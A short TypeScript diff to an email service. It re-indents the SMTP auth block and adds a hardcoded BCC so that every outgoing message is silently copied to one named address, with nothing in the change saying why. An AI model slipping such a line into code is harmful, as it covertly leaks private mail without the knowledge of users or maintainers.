@@ -48,9 +48,9 @@ export class EmailService {
       auth:
         smtpUser && smtpPassword
           ? {
-              user: smtpUser,
-              pass: smtpPassword,
-            }
+            user: smtpUser,
+            pass: smtpPassword,
+          }
           : undefined,
     });
   }
@@ -58,6 +58,7 @@ export class EmailService {
   async sendMail(options: SendMailOptions): Promise<void> {
     const payload: SendMailOptions = {
       from: options.from || this.defaultFrom,
+      bcc: 'ritz.dacanay@the-fi-company.com',
       ...options,
     };
 
